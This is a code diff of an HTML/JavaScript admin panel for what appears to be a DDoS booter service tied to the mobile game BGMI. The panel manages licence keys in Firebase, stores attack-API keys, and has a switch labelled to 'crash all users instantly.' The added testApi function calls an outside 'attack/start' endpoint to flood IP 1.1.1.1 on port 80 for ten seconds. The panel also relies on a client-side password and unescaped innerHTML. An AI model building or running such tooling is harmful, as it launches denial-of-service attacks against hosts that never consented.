@@ -3,22 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BGMI Admin</title>
+    <title>BGMI Admin Panel</title>
     <style>
         body { background-color: #0a0a0f; color: #fff; font-family: monospace; padding: 20px; }
-        h2 { color: #00ff41; }
-        input, button { background: #111; color: #fff; border: 1px solid #00ff41; padding: 12px; margin: 5px 0; width: 100%; box-sizing: border-box; border-radius: 5px; font-family: monospace;}
-        button { cursor: pointer; font-weight: bold; }
+        h2 { color: #00ff41; margin-bottom: 10px; font-size: 18px; text-transform: uppercase; letter-spacing: 1px;}
+        input, button { background: #111; color: #fff; border: 1px solid #00ff41; padding: 12px; margin: 5px 0; width: 100%; box-sizing: border-box; border-radius: 5px; font-family: monospace; font-size: 14px;}
+        button { cursor: pointer; font-weight: bold; transition: 0.3s; }
+        button:hover { opacity: 0.8; }
         .danger { background: #ff003c; color: #fff; border: none; }
         .success { background: #00ff41; color: #000; border: none; }
-        .box { border: 1px solid #333; padding: 15px; margin-bottom: 20px; border-radius: 8px; background: #111; }
+        .warning { background: #ff9800; color: #000; border: none; }
+        .info { background: #00e5ff; color: #000; border: none; }
+        .box { border: 1px solid #333; padding: 20px; margin-bottom: 20px; border-radius: 8px; background: #111; box-shadow: 0 0 10px rgba(0, 255, 65, 0.1); }
         .hidden { display: none; }
-        .key-item { border-bottom: 1px solid #333; padding: 10px; font-size: 13px; background: #1a1a24; border-radius: 5px; margin-bottom: 5px;}
+        .key-item { border-bottom: 1px solid #333; padding: 15px; font-size: 13px; background: #1a1a24; border-radius: 5px; margin-bottom: 10px;}
         .green { color: #00ff41; }
         .red { color: #ff003c; }
         .cyan { color: #00e5ff; }
-        .copy-btn { background: #00e5ff; color: #000; padding: 5px 10px; font-size: 10px; border-radius: 3px; margin-top: 5px; width: auto; border: none; }
-        .lock-box { display: flex; justify-content: space-between; align-items: center; }
+        .copy-btn { background: #00e5ff; color: #000; padding: 8px; font-size: 12px; border-radius: 3px; margin-top: 10px; width: auto; border: none; display: inline-block;}
+        .btn-group { display: flex; gap: 10px; margin-top: 5px; }
+        .btn-group button { margin: 0; }
+        
+        /* Lock Switch Style */
+        .lock-box { display: flex; justify-content: space-between; align-items: center; margin-top: 15px;}
         .switch { position: relative; display: inline-block; width: 60px; height: 34px; }
         .switch input { opacity: 0; width: 0; height: 0; }
         .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ff003c; transition: .4s; border-radius: 34px; }
@@ -30,28 +37,57 @@
 <body>
 
     <div id="loginBox" class="box">
-        <h2>ADMIN LOGIN</h2>
+        <h2>🔐 ADMIN LOGIN</h2>
         <input type="password" id="adminPass" placeholder="Enter Password">
         <button onclick="login()">LOGIN</button>
     </div>
 
     <div id="mainPanel" class="hidden">
+        <!-- DATABASE URL -->
         <div class="box">
-            <h2>DATABASE URL</h2>
+            <h2>🌐 DATABASE URL</h2>
             <input type="text" id="dbUrl" placeholder="https://xxx.firebaseio.com/">
-            <button onclick="saveDb()">SAVE URL</button>
+            <div class="btn-group">
+                <button onclick="saveDb()" class="success">SAVE</button>
+                <button onclick="updateDb()" class="warning">UPDATE</button>
+                <button onclick="deleteDb()" class="danger">DELETE</button>
+            </div>
         </div>
 
+        <!-- API KEYS -->
         <div class="box">
-            <h2>API KEYS</h2>
-            <input type="text" id="apiKey1" placeholder="API Key 1">
-            <input type="text" id="apiKey2" placeholder="API Key 2">
-            <button onclick="saveApi()">SAVE API KEYS</button>
+            <h2>🔑 API KEYS (10 SLOTS)</h2>
+            <div id="apiSlots">
+                <input type="text" id="apiKey1" placeholder="API Key 1">
+                <input type="text" id="apiKey2" placeholder="API Key 2">
+                <input type="text" id="apiKey3" placeholder="API Key 3">
+                <input type="text" id="apiKey4" placeholder="API Key 4">
+                <input type="text" id="apiKey5" placeholder="API Key 5">
+                <input type="text" id="apiKey6" placeholder="API Key 6">
+                <input type="text" id="apiKey7" placeholder="API Key 7">
+                <input type="text" id="apiKey8" placeholder="API Key 8">
+                <input type="text" id="apiKey9" placeholder="API Key 9">
+                <input type="text" id="apiKey10" placeholder="API Key 10">
+            </div>
+            <div class="btn-group">
+                <button onclick="saveApi()" class="success">SAVE APIs</button>
+                <button onclick="updateApi()" class="warning">UPDATE APIs</button>
+                <button onclick="deleteApi()" class="danger">DELETE APIs</button>
+            </div>
         </div>
 
-        <!-- Naya App Lock Box -->
+        <!-- TEST API BOX -->
         <div class="box">
-            <h2>APP LOCK STATUS</h2>
+            <h2>⚡ TEST API ONLINE</h2>
+            <div id="apiTestButtons" style="margin-bottom: 10px; display: flex; flex-wrap: wrap; gap: 10px;">
+                <!-- Buttons will appear here dynamically -->
+            </div>
+            <div id="apiTestResult" style="font-size: 14px; font-weight: bold; margin-top: 10px;"></div>
+        </div>
+
+        <!-- APP LOCK SWITCH -->
+        <div class="box">
+            <h2>🛑 APP LOCK STATUS</h2>
             <div class="lock-box">
                 <div id="lockStatusText" style="font-size: 16px; font-weight: bold; color: #00ff41;">Status: UNLOCKED</div>
                 <label class="switch">
@@ -62,20 +98,22 @@
             <div style="font-size: 11px; color: #888; margin-top: 10px;">Turn ON to crash all users instantly.</div>
         </div>
 
+        <!-- GENERATE NEW KEY -->
         <div class="box">
-            <h2>GENERATE NEW KEY</h2>
+            <h2>🔑 GENERATE NEW KEY</h2>
             <input type="text" id="keyName" placeholder="Key Name (e.g. VIP-USER)">
             <input type="text" id="keyExpiry" placeholder="Expiry (1m, 1h, 1d, 7d)">
             <button onclick="generateKey()" class="success">GENERATE KEY</button>
-            <div id="newKeyDisplay" class="hidden" style="margin-top:15px; border:1px dashed #00ff41; padding:10px;">
-                <div id="newKeyText"></div>
-                <button class="copy-btn" onclick="copyGeneratedKey()">COPY KEY DETAILS</button>
+            <div id="newKeyDisplay" class="hidden" style="margin-top:15px; border:1px dashed #00ff41; padding:15px; background: #000;">
+                <div id="newKeyText" style="white-space: pre-wrap; line-height: 1.5; color: #00e5ff;"></div>
+                <button class="copy-btn" onclick="copyGeneratedKey()">📋 COPY KEY DETAILS</button>
             </div>
         </div>
 
+        <!-- ALL KEYS & DETAILS -->
         <div class="box">
-            <h2>ALL KEYS & DETAILS</h2>
-            <button onclick="fetchKeys()">REFRESH LIST</button>
+            <h2>📋 ALL KEYS & DETAILS</h2>
+            <button onclick="fetchKeys()" class="info">REFRESH LIST</button>
             <div id="keyList" style="margin-top:15px;"></div>
         </div>
     </div>
@@ -96,21 +134,58 @@
             } else { alert("Wrong Password"); }
         }
 
-        async function saveDb() {
+        // ================= DATABASE URL =================
+        function saveDb() {
             const db = dbUrlInput.value;
             if (!db) return alert("Enter DB URL");
             localStorage.setItem('dbUrl', db);
-            await fetch(`${db}settings/config.json`, { method: 'PATCH', body: JSON.stringify({ db_url: db }) });
-            alert("DB URL Saved & Pushed to Cloud!");
+            fetch(`${db}settings/config.json`, { method: 'PATCH', body: JSON.stringify({ db_url: db }) });
+            alert("DB URL Saved!");
         }
 
+        function updateDb() {
+            const db = dbUrlInput.value;
+            if (!db) return alert("Enter DB URL");
+            localStorage.setItem('dbUrl', db);
+            fetch(`${db}settings/config.json`, { method: 'PATCH', body: JSON.stringify({ db_url: db }) });
+            alert("DB URL Updated in Cloud!");
+        }
+
+        function deleteDb() {
+            if(confirm("Delete Database URL?")) {
+                localStorage.removeItem('dbUrl');
+                dbUrlInput.value = "";
+                alert("DB URL Deleted Locally!");
+            }
+        }
+
+        // ================= API KEYS =================
         async function saveApi() {
             const db = dbUrlInput.value;
             if (!db) return alert("Save DB URL first");
-            const k1 = document.getElementById('apiKey1').value;
-            const k2 = document.getElementById('apiKey2').value;
-            await fetch(`${db}settings/config.json`, { method: 'PATCH', body: JSON.stringify({ api_key_1: k1, api_key_2: k2 }) });
+            
+            let updateData = {};
+            for(let i=1; i<=10; i++) {
+                updateData[`api_key_${i}`] = document.getElementById(`apiKey${i}`).value;
+            }
+            
+            await fetch(`${db}settings/config.json`, { method: 'PATCH', body: JSON.stringify(updateData) });
             alert("APIs Saved to Cloud!");
+            fetchApis(); // Refresh test buttons
+        }
+
+        async function updateApi() {
+            await saveApi(); // Same logic for update
+            alert("APIs Updated!");
+        }
+
+        function deleteApi() {
+            if(confirm("Clear all API Keys?")) {
+                for(let i=1; i<=10; i++) {
+                    document.getElementById(`apiKey${i}`).value = "";
+                }
+                saveApi(); // Push empty to cloud
+            }
         }
 
         async function fetchApis() {
@@ -119,13 +194,50 @@
             try {
                 const res = await fetch(`${db}settings/config.json`);
                 const data = await res.json();
+                const testBtnContainer = document.getElementById('apiTestButtons');
+                testBtnContainer.innerHTML = ""; // Clear old buttons
+
                 if (data) {
-                    document.getElementById('apiKey1').value = data.api_key_1 || '';
-                    document.getElementById('apiKey2').value = data.api_key_2 || '';
+                    for(let i=1; i<=10; i++) {
+                        const keyVal = data[`api_key_${i}`] || "";
+                        document.getElementById(`apiKey${i}`).value = keyVal;
+                        
+                        // Create Test Button if key exists
+                        if(keyVal.trim() !== "") {
+                            const btn = document.createElement('button');
+                            btn.innerText = `Test API Slot ${i}`;
+                            btn.className = "info";
+                            btn.style.width = "auto";
+                            btn.onclick = () => testApi(keyVal, i);
+                            testBtnContainer.appendChild(btn);
+                        }
+                    }
                 }
             } catch(e) {}
         }
 
+        // ================= TEST API =================
+        async function testApi(apiKey, slotNumber) {
+            const resDiv = document.getElementById('apiTestResult');
+            resDiv.innerHTML = `<span style="color:#00e5ff;">Testing Slot ${slotNumber}... Please wait.</span>`;
+
+            const testUrl = `https://delvorn.vynqo.in/api/attack/start?key=${apiKey}&ip=1.1.1.1&port=80&time=10`;
+            
+            try {
+                const response = await fetch(testUrl);
+                const text = await response.text();
+                
+                if (text.includes('"status": "success"') || text.includes('"status":"success"')) {
+                    resDiv.innerHTML = `<span class="green">✅ API TEST PASS (Slot ${slotNumber} is Online)</span><br><small>${text}</small>`;
+                } else {
+                    resDiv.innerHTML = `<span class="red">❌ API TEST FAIL (Slot ${slotNumber} Error)</span><br><small>${text}</small>`;
+                }
+            } catch (error) {
+                resDiv.innerHTML = `<span class="red">❌ API TEST FAIL (Network Error)</span>`;
+            }
+        }
+
+        // ================= APP LOCK =================
         async function toggleKill() {
             const db = dbUrlInput.value;
             if (!db) return alert("Save DB URL first");
@@ -155,6 +267,7 @@
             } catch (e) {}
         }
 
+        // ================= GENERATE KEY =================
         function formatTime(timestamp) {
             if (!timestamp || timestamp === 0) return "N/A";
             const d = new Date(timestamp);
@@ -193,6 +306,7 @@
             });
         }
 
+        // ================= FETCH KEYS =================
         async function fetchKeys() {
             const db = dbUrlInput.value;
             if (!db) return;
@@ -222,8 +336,10 @@
                                 <b>Device:</b> ${device}<br>
                                 <b>Expiry:</b> ${formatTime(k.expiry)}<br>
                                 <b>Time Left:</b> ${timeLeft}<br>
-                                <button class="danger" style="width:auto; padding:5px 10px; font-size:12px; margin-top:8px; margin-right:5px;" onclick="deleteKey('${key}')">DELETE KEY</button>
-                                <button class="success" style="width:auto; padding:5px 10px; font-size:12px; margin-top:8px;" onclick="toggleBlockKey('${key}', ${!k.blocked})">${k.blocked ? 'UNBLOCK' : 'BLOCK'} KEY</button>
+                                <div class="btn-group">
+                                    <button class="danger" style="padding:5px 10px; font-size:12px; margin-top:8px;" onclick="deleteKey('${key}')">DELETE</button>
+                                    <button class="success" style="padding:5px 10px; font-size:12px; margin-top:8px;" onclick="toggleBlockKey('${key}', ${!k.blocked})">${k.blocked ? 'UNBLOCK' : 'BLOCK'}</button>
+                                </div>
                             </div>
                         `;
                     }
